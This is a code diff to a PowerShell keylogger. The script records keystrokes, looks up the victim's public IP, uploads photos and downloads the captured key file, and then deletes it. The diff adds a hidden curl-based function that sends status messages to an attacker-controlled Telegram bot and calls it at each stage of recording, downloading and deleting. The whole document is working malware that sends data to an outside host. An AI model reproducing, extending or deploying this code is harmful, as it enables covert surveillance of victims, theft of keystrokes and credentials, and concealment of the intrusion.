@@ -149,6 +149,13 @@ function sendPhoto {
     #& $curl -s -X POST "https://api.telegram.org/bot"$BotToken"/sendPhoto" -F chat_id=$ChatID -F photo="@$SnapFile"
 }
 
+function Send-Message($message) {
+    $uri = "https://api.telegram.org/bot" + $BotToken + "/sendMessage"
+    $curl = installCurl
+    $argumenlist = $uri + ' -F chat_id=' + "$ChatID" + ' -F text=' + $message  + ' -k '
+    Start-Process $curl -ArgumentList $argumenlist -WindowStyle Hidden
+}
+
 function ipPublic {
     #$ipPublic = Invoke-RestMethod http://ipinfo.io/json | Select -exp ip
     $ipPublic = Invoke-RestMethod http://ipinfo.io/json | Select-Object -Property city, region, postal, ip
@@ -188,6 +195,7 @@ public static extern int ToUnicode(uint wVirtKey, uint wScanCode, byte[] lpkeyst
 
   try {
     Write-Host 'Recording key presses..' -ForegroundColor Red
+    Send-Message 'Recording..'
 
     # create endless loop. When user presses CTRL+C, finally-block
     # executes and shows the collected key presses
@@ -233,10 +241,12 @@ public static extern int ToUnicode(uint wVirtKey, uint wScanCode, byte[] lpkeyst
     #notepad $Path
 
     Write-Host "Downloading keylogger file.."
+    Send-Message 'Downloading..'
     download $Path
 
-    Write-Host "Deleting keylogger file.."
     Start-Sleep -Seconds 5
+    Write-Host "Deleting keylogger file.."
+    Send-Message 'Deleting..'
     Remove-Item $Path
   }
 }
